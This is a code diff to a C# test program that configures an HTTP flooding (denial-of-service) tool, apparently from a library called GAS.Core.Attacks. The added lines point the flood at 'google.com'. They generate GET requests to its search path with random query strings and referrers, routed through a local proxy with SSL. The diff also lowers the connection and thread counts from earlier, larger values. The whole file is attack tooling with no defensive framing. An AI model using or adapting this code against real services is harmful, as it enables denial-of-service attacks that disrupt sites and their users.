@@ -3,22 +3,34 @@ using System.Net;
 using System.Threading;
 using GAS.Core.AttackInformation;
 using GAS.Core.Attacks;
+using kasthack.Tools;
+using RandomStringGenerator;
 
 namespace TestApp {
     class Program {
         private static void Main() {
+            var attackDomain = "google.com";
+            var he = ExpressionParser.Create(
+                        AsyncFlooderImplementations.GenerateHeaderExpression(
+                            domain: attackDomain,
+                            method: "GET",
+                            gzip: true,
+                            baseUrlExpression: "/search/?q={S:U:1:100}",
+                            referrerFromDomain: true
+                        )
+                    );
+            he.ToString().Dump();
             var f = new AsyncHttpFlooder {
                 HttpAttackInfo = new HttpAttackInfo {
                     Target = new IPEndPoint( IPAddress.Parse( "127.0.0.1" ), 8118 ),
-                    MaxConnections = 500,
-                    Ssl = new SslInfo() {
-                        
+                    MaxConnections = 1,
+                    Ssl = new SslInfo {
+                        UseSsl = true,
+                        Domain = attackDomain
                     },
-                    
+                    HeaderExpression = he
                 },
-                Interval = 15,
-                MaxThreads = 100,
-                MaxTasks = 10000
+                Interval = 1000
             };
             f.Start();
             for (var i = 0; i < 200; i++) {
